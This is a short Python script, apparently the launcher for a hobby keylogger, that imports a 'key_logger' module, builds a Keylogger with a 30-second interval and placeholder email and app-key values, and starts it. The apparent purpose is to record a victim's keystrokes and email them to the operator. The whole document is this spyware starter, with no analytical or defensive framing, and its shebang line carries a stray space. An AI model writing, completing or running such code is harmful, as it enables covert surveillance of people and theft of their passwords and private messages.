#!/usr/bin /env python3

import key_logger

my_keylogger = key_logger.Keylogger(30, "YOUR_EMAIL_HERE", "APP_KEY_BY_YOUR_PROVIDER")
my_keylogger.start()
